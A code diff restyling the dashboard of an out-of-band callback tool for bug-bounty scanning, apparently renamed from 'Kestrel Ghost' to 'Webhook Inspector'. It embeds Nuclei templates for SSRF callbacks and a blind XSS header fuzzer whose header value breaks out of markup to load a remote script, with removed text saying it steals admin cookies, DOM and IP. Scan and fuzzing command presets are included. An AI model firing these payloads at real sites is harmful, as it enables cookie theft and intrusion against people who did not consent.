                           {copiedText === 'builder-cmd' ? (
-                            <span style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--color-success)', fontSize: '0.75rem', fontWeight: '700' }}>
-                              <Check size={14} /> Copied!
+                            <span style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--color-success)' }}>
+                              <Check size={13} /> Copied
                             </span>
                           ) : (
-                            <span style={{ display: 'flex', alignItems: 'center', gap: '6px', color: '#00e676', fontSize: '0.75rem', fontWeight: '700' }}>
-                              <Copy size={14} /> Copy Command
+                            <span style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
+                              <Copy size={13} /> Copy
                             </span>
                           )}
                         </button>
@@ -2502,26 +1903,26 @@ export default function DashboardPage({ params }) {
 
               {/* 2. OOB SSRF & RCE TEMPLATE */}
               {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'OOB_SSRF') && (
-                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
-                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                      <Zap size={18} style={{ color: 'var(--color-primary)' }} />
-                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <Zap size={16} style={{ color: 'var(--color-primary)' }} />
+                      <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
                         1. Out-of-Band (OOB) SSRF / RCE Nuclei Template
                       </h3>
                     </div>
                     <span className="badge badge-info" style={{ fontSize: '0.65rem' }}>Auto-Configured for /api/r/{id}</span>
                   </div>
 
-                  <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', lineHeight: '1.5' }}>
-                    Use this custom template to trigger HTTP/SSRF pingbacks from the target application. Any inbound connection will be captured in real-time under the <strong>OOB</strong> tab of this dashboard.
+                  <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
+                    Use this custom template to trigger HTTP/SSRF callbacks from the target application. Any inbound request will be logged under the <strong>OOB</strong> tab of this dashboard.
                   </p>
 
                   {(() => {
-                    const ssrfTemplateCode = `id: kestrel-ssrf-oob-hunter
+                    const ssrfTemplateCode = `id: inspector-ssrf-oob
 
 info:
-  name: Out-of-Band SSRF Detection via Kestrel Ghost
+  name: Out-of-Band SSRF Detection via Webhook Inspector
   author: robbypranata
   severity: high
   description: Triggers outbound HTTP callbacks to your active Webhook Inspector endpoint.
@@ -2547,20 +1948,19 @@ http:
     stop-at-first-match: true`;
 
                     return (
-                      <div style={{ position: 'relative', background: '#040608', border: '1px solid var(--border-medium)', borderRadius: 'var(--radius-lg)', overflow: 'hidden' }}>
-                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 16px', background: 'rgba(255,255,255,0.02)', borderBottom: '1px solid var(--border-light)' }}>
-                          <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--color-primary)', fontFamily: 'monospace' }}>
-                            📄 kestrel-ssrf-oob.yaml
+                      <div style={{ position: 'relative', background: 'var(--bg-surface)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-sm)', overflow: 'hidden' }}>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 14px', background: 'var(--bg-input)', borderBottom: '1px solid var(--border-light)' }}>
+                          <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
+                            inspector-ssrf-oob.yaml
                           </span>
                           <button
                             onClick={() => handleCopy(ssrfTemplateCode, 'ssrf-yaml')}
                             className={styles.copyBtn}
-                            style={{ padding: '4px 10px', fontSize: '0.75rem', background: 'rgba(0, 242, 254, 0.08)', border: '1px solid rgba(0, 242, 254, 0.2)', borderRadius: '4px', color: 'var(--color-primary)' }}
                           >
-                            {copiedText === 'ssrf-yaml' ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy Template</>}
+                            {copiedText === 'ssrf-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
                           </button>
                         </div>
-                        <pre style={{ padding: '18px', margin: 0, fontSize: '0.82rem', fontFamily: 'monospace', color: '#00e676', overflowX: 'auto', lineHeight: '1.6' }}>
+                        <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                           {ssrfTemplateCode}
                         </pre>
                       </div>
@@ -2571,28 +1971,28 @@ http:
 
               {/* 3. BLIND XSS HEADER FUZZER */}
               {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'BLIND_XSS') && (
-                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
-                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                      <ShieldAlert size={18} style={{ color: '#7c4dff' }} />
-                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <ShieldAlert size={16} style={{ color: 'var(--color-primary)' }} />
+                      <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
                         2. Blind XSS Header & Parameter Fuzzer Template
                       </h3>
                     </div>
-                    <span className="badge" style={{ fontSize: '0.65rem', background: 'rgba(124, 77, 255, 0.15)', color: '#7c4dff', border: '1px solid rgba(124, 77, 255, 0.3)' }}>
+                    <span className="badge badge-neutral" style={{ fontSize: '0.65rem' }}>
                       Auto-Configured for /api/x?id={id}
                     </span>
                   </div>
 
-                  <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', lineHeight: '1.5' }}>
-                    Injects your stealth Blind XSS payload into standard HTTP request headers. When an administrator or backend system logs and renders the header, the payload triggers and exfiltrates cookies, DOM, and victim IP directly to your <strong>XSS</strong> tab!
+                  <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
+                    Injects your Blind XSS payload into standard HTTP request headers. When rendered in an admin panel or browser, the script triggers and captures environment details under your <strong>XSS</strong> tab.
                   </p>
 
                   {(() => {
-                    const xssTemplateCode = `id: kestrel-blind-xss-fuzzer
+                    const xssTemplateCode = `id: inspector-blind-xss
 
 info:
-  name: Blind XSS Probe Injection via Kestrel Ghost
+  name: Blind XSS Probe Injection via Webhook Inspector
   author: robbypranata
   severity: medium
   tags: xss,blind-xss,oob
@@ -2613,20 +2013,19 @@ http:
       Contact-Email: 'test"><script src="${xssPayloadUrl}"></script>'`;
 
                     return (
-                      <div style={{ position: 'relative', background: '#040608', border: '1px solid var(--border-medium)', borderRadius: 'var(--radius-lg)', overflow: 'hidden' }}>
-                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 16px', background: 'rgba(255,255,255,0.02)', borderBottom: '1px solid var(--border-light)' }}>
-                          <span style={{ fontSize: '0.75rem', fontWeight: '750', color: '#7c4dff', fontFamily: 'monospace' }}>
-                            📄 kestrel-blind-xss.yaml
+                      <div style={{ position: 'relative', background: 'var(--bg-surface)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-sm)', overflow: 'hidden' }}>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 14px', background: 'var(--bg-input)', borderBottom: '1px solid var(--border-light)' }}>
+                          <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
+                            inspector-blind-xss.yaml
                           </span>
                           <button
                             onClick={() => handleCopy(xssTemplateCode, 'xss-yaml')}
                             className={styles.copyBtn}
-                            style={{ padding: '4px 10px', fontSize: '0.75rem', background: 'rgba(124, 77, 255, 0.1)', border: '1px solid rgba(124, 77, 255, 0.25)', borderRadius: '4px', color: '#7c4dff' }}
                           >
-                            {copiedText === 'xss-yaml' ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy Template</>}
+                            {copiedText === 'xss-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
                           </button>
                         </div>
-                        <pre style={{ padding: '18px', margin: 0, fontSize: '0.82rem', fontFamily: 'monospace', color: '#c084fc', overflowX: 'auto', lineHeight: '1.6' }}>
+                        <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                           {xssTemplateCode}
                         </pre>
                       </div>
@@ -2637,66 +2036,65 @@ http:
 
               {/* 4. REALTIME SCAN WEBHOOK REPORTING */}
               {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'REPORTING') && (
-                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
-                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                      <Radio size={18} style={{ color: '#ff9100' }} />
-                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-                        3. Stream Nuclei Findings via Webhook Reporting
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <Radio size={16} style={{ color: 'var(--color-primary)' }} />
+                      <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
+                        3. Stream Findings via Webhook
                       </h3>
                     </div>
-                    <span className="badge" style={{ fontSize: '0.65rem', background: 'rgba(255, 145, 0, 0.15)', color: '#ff9100', border: '1px solid rgba(255, 145, 0, 0.3)' }}>
+                    <span className="badge badge-warning" style={{ fontSize: '0.65rem' }}>
                       Real-time JSON Stream
                     </span>
                   </div>
 
-                  <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', lineHeight: '1.5' }}>
-                    Configure Nuclei to automatically push scan findings into this Webhook Inspector dashboard in real-time as vulnerabilities are discovered during high-volume scans.
+                  <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
+                    Configure Nuclei to forward findings directly to this listener endpoint in real-time as vulnerabilities are discovered.
                   </p>
 
                   {(() => {
                     const reportConfig = `# reporting-config.yaml
 webhook:
-  - id: kestrel-ghost-receiver
+  - id: webhook-inspector-receiver
     server-url: "${webhookUrl}?src=nuclei_report"
     username: ""
     password: ""`;
 
                     return (
-                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '16px' }}>
-                        <div style={{ background: '#040608', border: '1px solid var(--border-medium)', borderRadius: 'var(--radius-lg)', overflow: 'hidden' }}>
-                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 16px', background: 'rgba(255,255,255,0.02)', borderBottom: '1px solid var(--border-light)' }}>
-                            <span style={{ fontSize: '0.75rem', fontWeight: '750', color: '#ff9100', fontFamily: 'monospace' }}>
-                              📄 reporting-config.yaml
+                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '14px' }}>
+                        <div style={{ background: 'var(--bg-surface)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-sm)', overflow: 'hidden' }}>
+                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 14px', background: 'var(--bg-input)', borderBottom: '1px solid var(--border-light)' }}>
+                            <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
+                              reporting-config.yaml
                             </span>
                             <button
                               onClick={() => handleCopy(reportConfig, 'report-yaml')}
                               className={styles.copyBtn}
-                              style={{ padding: '4px 10px', fontSize: '0.75rem', color: '#ff9100' }}
                             >
-                              {copiedText === 'report-yaml' ? <Check size={14} /> : <Copy size={14} />}
+                              {copiedText === 'report-yaml' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                             </button>
                           </div>
-                          <pre style={{ padding: '16px', margin: 0, fontSize: '0.82rem', fontFamily: 'monospace', color: '#ffd166', overflowX: 'auto', lineHeight: '1.6' }}>
+                          <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                             {reportConfig}
                           </pre>
                         </div>
 
-                        <div style={{ padding: '18px', background: 'rgba(255,255,255,0.01)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-lg)', display: 'flex', flexDirection: 'column', gap: '10px' }}>
-                          <span style={{ fontSize: '0.8rem', fontWeight: '800', color: 'var(--text-main)' }}>CLI Execution Command</span>
-                          <div style={{ display: 'flex', alignItems: 'center', background: '#040608', padding: '10px 12px', borderRadius: '6px', border: '1px solid var(--border-medium)', gap: '8px' }}>
-                            <code style={{ fontSize: '0.8rem', color: '#00e676', flex: 1, overflowX: 'auto' }}>
+                        <div style={{ padding: '16px', background: 'var(--bg-surface)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-sm)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                          <span style={{ fontSize: '0.78rem', fontWeight: '600', color: 'var(--text-main)' }}>CLI Execution Command</span>
+                          <div style={{ display: 'flex', alignItems: 'center', background: 'var(--bg-input)', padding: '10px 12px', borderRadius: 'var(--radius-xs)', border: '1px solid var(--border-light)', gap: '8px' }}>
+                            <code style={{ fontSize: '0.78rem', color: 'var(--text-main)', flex: 1, overflowX: 'auto', whiteSpace: 'nowrap' }}>
                               nuclei -u https://target.com -t cves/ -report-config reporting-config.yaml
                             </code>
                             <button 
                               onClick={() => handleCopy('nuclei -u https://target.com -t cves/ -report-config reporting-config.yaml', 'report-cmd')}
                               className={styles.copyBtn}
                             >
-                              {copiedText === 'report-cmd' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                              {copiedText === 'report-cmd' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                             </button>
                           </div>
-                          <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
-                            Findings will appear instantly inside your <strong>OOB Callbacks</strong> table with full vulnerability severity, CVE IDs, matched URLs, and extracted evidence!
+                          <p style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', margin: 0 }}>
+                            Findings will stream into your <strong>OOB</strong> tab with vulnerability details and payload context.
                           </p>
                         </div>
                       </div>
@@ -2707,71 +2105,71 @@ webhook:
 
               {/* 5. LOCAL COMMUNITY TEMPLATES REPOSITORY GUIDE */}
               {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'COMMUNITY') && (
-                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
-                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                      <Database size={18} style={{ color: 'var(--color-success)' }} />
-                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-                        4. Local Community Templates Suite (110,000+ Templates)
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <Database size={16} style={{ color: 'var(--color-primary)' }} />
+                      <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
+                        4. Scanning Presets
                       </h3>
                     </div>
-                    <span className="badge badge-success" style={{ fontSize: '0.65rem' }}>C:\templates\</span>
+                    <span className="badge badge-neutral" style={{ fontSize: '0.65rem' }}>C:\templates\</span>
                   </div>
 
-                  <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', lineHeight: '1.5' }}>
-                    Your system is provisioned with 110,000+ custom security templates located at <code>C:\templates\</code> (linked via junction from custom-nuclei-templates). Run targeted scans against bug bounty scopes using these command presets:
+                  <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
+                    Execute targeted scans using curated community template collections:
                   </p>
 
-                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: '14px' }}>
+                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '12px' }}>
                     {[
                       {
-                        title: '🔥 Full High & Critical Recon Scan',
-                        desc: 'Executes all local community templates filtered to critical and high severity.',
+                        title: 'Critical & High Severity Recon',
+                        desc: 'Executes community templates filtered to critical and high severity.',
                         cmd: 'nuclei -u https://target.com -t C:\\templates\\ -s critical,high'
                       },
                       {
-                        title: '🌐 WordPress Wordfence CVEs (70k+ Templates)',
+                        title: 'WordPress Wordfence CVEs',
                         desc: 'Scans WordPress installations for known plugin and theme vulnerabilities.',
                         cmd: 'nuclei -u https://target.com -t C:\\templates\\topscoder_nuclei-wordfence-cve\\'
                       },
                       {
-                        title: '⚡ Stealth Fuzzing with Rate Limits',
-                        desc: 'Fuzzes parameters with controlled rate limits to avoid WAF rate-limiting.',
+                        title: 'Rate-Limited Parameter Fuzzing',
+                        desc: 'Fuzzes parameters with controlled rate limits to avoid server throttling.',
                         cmd: 'nuclei -u https://target.com -t C:\\templates\\projectdiscovery_fuzzing-templates\\ -rl 30 -c 10'
                       },
                       {
-                        title: '🎯 Multi-Target Batch Reconnaissance',
-                        desc: 'Scans an entire list of discovered subdomains against all template categories.',
+                        title: 'Multi-Target Reconnaissance',
+                        desc: 'Scans an entire list of discovered targets from a file.',
                         cmd: 'nuclei -l targets.txt -t C:\\templates\\ -s critical,high -rl 50 -c 25'
                       }
                     ].map((recipe, idx) => (
                       <div 
                         key={idx}
                         style={{
-                          padding: '16px',
-                          background: 'rgba(255,255,255,0.015)',
+                          padding: '14px',
+                          background: 'var(--bg-surface)',
                           border: '1px solid var(--border-light)',
-                          borderRadius: 'var(--radius-lg)',
+                          borderRadius: 'var(--radius-sm)',
                           display: 'flex',
                           flexDirection: 'column',
-                          gap: '10px'
+                          gap: '8px'
                         }}
                       >
-                        <span style={{ fontSize: '0.85rem', fontWeight: '750', color: 'var(--text-main)' }}>
+                        <span style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)' }}>
                           {recipe.title}
                         </span>
-                        <div style={{ display: 'flex', alignItems: 'center', background: '#040608', padding: '10px 12px', borderRadius: '6px', border: '1px solid var(--border-medium)', gap: '8px' }}>
-                          <code style={{ fontSize: '0.78rem', color: '#00e676', flex: 1, overflowX: 'auto', whiteSpace: 'nowrap' }}>
+                        <div style={{ display: 'flex', alignItems: 'center', background: 'var(--bg-input)', padding: '8px 12px', borderRadius: 'var(--radius-xs)', border: '1px solid var(--border-light)', gap: '8px' }}>
+                          <code style={{ fontSize: '0.75rem', color: 'var(--text-main)', flex: 1, overflowX: 'auto', whiteSpace: 'nowrap' }}>
                             {recipe.cmd}
                           </code>
                           <button 
                             onClick={() => handleCopy(recipe.cmd, `recipe-${idx}`)}
                             className={styles.copyBtn}
                           >
-                            {copiedText === `recipe-${idx}` ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                            {copiedText === `recipe-${idx}` ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                           </button>
                         </div>
-                        <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
+                        <p style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', margin: 0 }}>
                           {recipe.desc}
                         </p>
                       </div>
@@ -2782,41 +2180,41 @@ webhook:
 
               {/* 6. CLI QUICK CHEATSHEET */}
               {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'CHEATSHEET') && (
-                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
-                    <BookOpen size={18} style={{ color: 'var(--color-primary)' }} />
-                    <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
-                      5. Essential Nuclei CLI Flags Cheatsheet
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
+                    <BookOpen size={16} style={{ color: 'var(--color-primary)' }} />
+                    <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
+                      5. Essential CLI Flags
                     </h3>
                   </div>
 
-                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '12px' }}>
+                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '10px' }}>
                     {[
                       { flag: '-u, -target <url>', desc: 'Target URL to scan' },
                       { flag: '-l, -list <file>', desc: 'Path to list of target URLs' },
-                      { flag: '-t, -templates <path>', desc: 'Template or template directory to run' },
+                      { flag: '-t, -templates <path>', desc: 'Template or directory to execute' },
                       { flag: '-s, -severity <level>', desc: 'Filter templates: info, low, medium, high, critical' },
-                      { flag: '-tags <tags>', desc: 'Filter templates by tag (e.g. ssrf, xss, cve, lfi)' },
-                      { flag: '-var <key=val>', desc: 'Pass custom variable to templates (e.g. callback URL)' },
-                      { flag: '-rl, -rate-limit <n>', desc: 'Maximum requests per second (e.g. -rl 50)' },
-                      { flag: '-c, -concurrency <n>', desc: 'Maximum number of concurrent templates to run' },
+                      { flag: '-tags <tags>', desc: 'Filter templates by tag (e.g. ssrf, xss, cve)' },
+                      { flag: '-var <key=val>', desc: 'Pass custom variable to templates' },
+                      { flag: '-rl, -rate-limit <n>', desc: 'Maximum requests per second' },
+                      { flag: '-c, -concurrency <n>', desc: 'Maximum concurrent templates' },
                       { flag: '-report-config <file>', desc: 'Send scan alerts/findings to Webhook Inspector' },
-                      { flag: '-tl', desc: 'List all available templates without executing' }
+                      { flag: '-tl', desc: 'List available templates without executing' }
                     ].map((item, idx) => (
                       <div 
                         key={idx}
                         style={{
-                          padding: '12px 14px',
-                          background: 'rgba(255,255,255,0.01)',
+                          padding: '10px 12px',
+                          background: 'var(--bg-surface)',
                           border: '1px solid var(--border-light)',
-                          borderRadius: 'var(--radius-md)',
+                          borderRadius: 'var(--radius-xs)',
                           display: 'flex',
                           flexDirection: 'column',
-                          gap: '4px'
+                          gap: '3px'
                         }}
                       >
-                        <code style={{ fontSize: '0.82rem', color: '#00e676', fontWeight: '700' }}>{item.flag}</code>
-                        <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>{item.desc}</span>
+                        <code style={{ fontSize: '0.78rem', color: 'var(--text-main)', fontWeight: '600' }}>{item.flag}</code>
+                        <span style={{ fontSize: '0.72rem', color: 'var(--text-secondary)' }}>{item.desc}</span>
                       </div>
                     ))}
                   </div>
@@ -2837,20 +2235,20 @@ webhook:
             <div className={styles.configHeader}>
               <h3 className={styles.configTitle}>
                 <Settings size={18} className={styles.logoIcon} />
-                Customize Ingestor Response
+                Endpoint Settings
               </h3>
               <button 
                 type="button" 
                 onClick={() => setIsConfigOpen(false)}
                 className={styles.copyBtn}
-                style={{ fontSize: '1.2rem', padding: '4px 8px' }}
+                style={{ fontSize: '1.1rem', padding: '4px 8px' }}
               >
                 ✕
               </button>
             </div>
 
-            <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginTop: '-8px' }}>
-              Configure the HTTP status, Content-Type, and response body payload returned by the ingestor when your OOB Callback URL is hit.
+            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginTop: '-8px' }}>
+              Configure the HTTP status, headers, and body returned when incoming webhook requests hit this endpoint.
             </p>
 
             <div className={styles.configGrid}>
@@ -2883,17 +2281,17 @@ webhook:
                   onChange={(e) => setConfigContentType(e.target.value)}
                   className={styles.selectField}
                 >
-                  <option value="application/json">application/json (JSON)</option>
-                  <option value="text/plain">text/plain (Plain Text)</option>
-                  <option value="text/html">text/html (HTML Content)</option>
-                  <option value="application/xml">application/xml (XML Document)</option>
+                  <option value="application/json">application/json</option>
+                  <option value="text/plain">text/plain</option>
+                  <option value="text/html">text/html</option>
+                  <option value="application/xml">application/xml</option>
                 </select>
               </div>
 
               <div className={styles.configFieldFull}>
-                <label className={styles.fieldLabel}>HTTP Response Body</label>
+                <label className={styles.fieldLabel}>Response Body</label>
                 <textarea 
-                  placeholder={configContentType === 'application/json' ? '{"success": true, "data": {}}' : 'Response payload...'}
+                  placeholder={configContentType === 'application/json' ? '{"success": true}' : 'Response body...'}
                   value={configBody}
                   onChange={(e) => setConfigBody(e.target.value)}
                   className={styles.textareaField}
@@ -2902,50 +2300,50 @@ webhook:
             </div>
 
             {/* Real-time Notifications Section */}
-            <div style={{ borderTop: '1px solid var(--border-light)', paddingTop: '20px', marginTop: '10px' }}>
-              <h4 style={{ fontSize: '0.85rem', fontWeight: '800', color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
-                <Radio size={16} style={{ color: '#00e676' }} className="animate-pulse" />
-                Real-Time Out-of-Band Alerts
+            <div style={{ borderTop: '1px solid var(--border-light)', paddingTop: '16px', marginTop: '8px' }}>
+              <h4 style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '14px' }}>
+                <Radio size={14} style={{ color: 'var(--color-primary)' }} />
+                Real-Time Alert Integrations
               </h4>
 
-              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '20px' }}>
+              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '16px' }}>
                 {/* Telegram Alert Block */}
-                <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', padding: '16px', borderRadius: '10px', border: '1px solid var(--border-light)', background: 'rgba(0,0,0,0.15)' }}>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '14px', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-light)', background: 'var(--bg-surface)' }}>
                   <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                     <input 
                       type="checkbox" 
                       id="telegram_enabled"
                       checked={configTelegramEnabled} 
                       onChange={(e) => setConfigTelegramEnabled(e.target.checked)}
-                      style={{ cursor: 'pointer', width: '16px', height: '16px', accentColor: '#00e676' }}
+                      style={{ cursor: 'pointer', width: '15px', height: '15px', accentColor: 'var(--color-primary)' }}
                     />
-                    <label htmlFor="telegram_enabled" style={{ fontSize: '0.8rem', fontWeight: '800', color: '#00e676', cursor: 'pointer', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
-                      ✈️ Telegram Alerts
+                    <label htmlFor="telegram_enabled" style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)', cursor: 'pointer' }}>
+                      Telegram Alerts
                     </label>
                   </div>
                   
                   {configTelegramEnabled && (
                     <div className="animate-fade-in" style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginTop: '4px' }}>
                       <div className={styles.configField}>
-                        <label className={styles.fieldLabel} style={{ fontSize: '0.62rem' }}>Bot Token</label>
+                        <label className={styles.fieldLabel} style={{ fontSize: '0.68rem' }}>Bot Token</label>
                         <input 
                           type="password"
                           placeholder="123456789:ABCdef..."
                           value={configTelegramToken}
                           onChange={(e) => setConfigTelegramToken(e.target.value)}
                           className={styles.inputField}
-                          style={{ fontSize: '0.75rem', padding: '8px 10px' }}
+                          style={{ fontSize: '0.75rem', padding: '6px 10px' }}
                         />
                       </div>
                       <div className={styles.configField}>
-                        <label className={styles.fieldLabel} style={{ fontSize: '0.62rem' }}>Chat ID</label>
+                        <label className={styles.fieldLabel} style={{ fontSize: '0.68rem' }}>Chat ID</label>
                         <input 
                           type="text"
                           placeholder="-100123456789"
                           value={configTelegramChatId}
                           onChange={(e) => setConfigTelegramChatId(e.target.value)}
                           className={styles.inputField}
-                          style={{ fontSize: '0.75rem', padding: '8px 10px' }}
+                          style={{ fontSize: '0.75rem', padding: '6px 10px' }}
                         />
                       </div>
                     </div>
@@ -2953,31 +2351,31 @@ webhook:
                 </div>
 
                 {/* Discord Alert Block */}
